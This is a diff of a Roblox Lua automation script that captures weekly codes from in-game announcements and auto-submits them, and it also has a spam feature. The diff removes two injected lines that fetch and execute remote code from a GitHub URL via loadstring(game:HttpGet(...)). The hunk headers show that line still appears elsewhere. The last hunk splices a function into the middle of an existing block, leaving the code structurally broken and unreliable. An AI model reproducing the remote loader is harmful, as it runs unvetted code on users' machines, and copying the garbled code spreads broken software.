@@ -1030,7 +1030,6 @@ local success, err = pcall(function()
     updateConsoleCanvas = function()
         if not Console or not ConsoleOutput then return end
         Console.CanvasSize = UDim2.new(0, 0, 0, ConsoleOutput.Position.Y.Offset + ConsoleOutput.AbsoluteSize.Y + CONSOLE_BOTTOM_PADDING)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
     end
     ConsoleOutput:GetPropertyChangedSignal("AbsoluteSize"):Connect(updateConsoleCanvas)
     task.defer(updateConsoleCanvas)
@@ -1510,7 +1509,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkf
         local num = tonumber(SpamBox.Text)
         if not num then num = _spamCount end
         applySpamCount(num)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
     end)
 
     -- Listen Key
@@ -2433,31 +2431,90 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkf
             local box = weeklyCodeBox()
             if box then
                 _programmaticChange = true
-                AAX.progText = _manualBuffer
-                box.Text = _manualBuffer
-                _programmaticChange = false
-            end
-            setStatus("Auto Guess: " .. _manualBuffer)
-            task.spawn(function()
-                if _autoTurnOnSubmit and not _autoAccept then
-                    turnOnAutoSubmit()
-                end
-                local ok = typeAndSubmitCode(_manualBuffer)
-                if ok then
-                    setStatus("Code redeem: " .. _manualBuffer)
-                    if _autoTurnOffSubmit then turnOffAutoSubmit() end
-                else
-                    setStatus("Auto Guess failed: " .. _manualBuffer)
-                end
-            end)
-            _manualResetTimer = task.delay(MANUAL_TIMEOUT, function()
-                _manualBuffer = ""
-                _manualResetTimer = nil
-            end)
-            return
-        end
+local function onWeeklyAnnouncement(...)
+    local rawText = ""
+    for i = 1, select("#", ...) do
+        local a = select(i, ...)
+        if type(a) == "string" and a ~= "" then rawText = weeklyStripRich(a); break end
+    end
+    rawText = rawText:match("^%s*(.-)%s*$") or ""
+    if rawText == "" then return end
 
-        appendToBox(captured)
+    if looksLikeSuccessMessage(rawText) then
+        clearManualBuffer()
+        return
+    end
+
+    if containsListenTrigger(rawText) then
+        clearManualBuffer()
+        if clearWeeklyCapture then clearWeeklyCapture() end
+    end
+
+    if _autoTurnOnListen and containsListenTrigger(rawText) then
+        if not _enabled then
+            _enabled = true
+            savedConfig.codeSniper = true
+            saveConfig()
+            setListenButtonOn()
+            setStatus("Auto enabled listen")
+        end
+    end
+
+    if not _enabled then return end
+
+    local cleaned = rawText:lower():gsub("the code was", " "):gsub("code was", " ")
+    cleaned = cleaned:match("^%s*(.-)%s*$") or ""
+
+    local words = weeklyTokenize(cleaned)
+    if #words < 1 then return end
+
+    local captured = nil
+    for i = #words, 1, -1 do
+        if words[i]:match("%d") then captured = words[i]; break end
+    end
+    if not captured then captured = words[#words] end
+    if captured == "" then return end
+
+    if WEEKLY_CASE_MODE == "LOWER" then captured = captured:lower() end
+    if _seen["code:" .. captured] then return end
+    _seen["code:" .. captured] = true
+    task.delay(1.25, function() _seen["code:" .. captured] = nil end)
+
+    if _manualModeEnabled then
+        if _manualResetTimer then
+            pcall(task.cancel, _manualResetTimer)
+            _manualResetTimer = nil
+        end
+        if _manualBuffer == "" then
+            _manualBuffer = captured
+        else
+            _manualBuffer = _manualBuffer .. " " .. captured
+        end
+        local box = weeklyCodeBox()
+        if box then
+            _programmaticChange = true
+            AAX.progText = _manualBuffer
+            box.Text = _manualBuffer
+            _programmaticChange = false
+        end
+        setStatus("Auto Guess: " .. _manualBuffer)
+        task.spawn(function()
+            if _autoTurnOnSubmit and not _autoAccept then
+                turnOnAutoSubmit()
+            end
+            local ok = typeAndSubmitCode(_manualBuffer)
+            if ok then
+                setStatus("Code redeem: " .. _manualBuffer)
+                if _autoTurnOffSubmit then turnOffAutoSubmit() end
+            else
+                setStatus("Auto Guess failed: " .. _manualBuffer)
+            end
+        end)
+        _manualResetTimer = task.delay(MANUAL_TIMEOUT, function()
+            _manualBuffer = ""
+            _manualResetTimer = nil
+        end)
+        return
     end
 
     local weeklyNotifyRemote = _earlyNotifyRemote
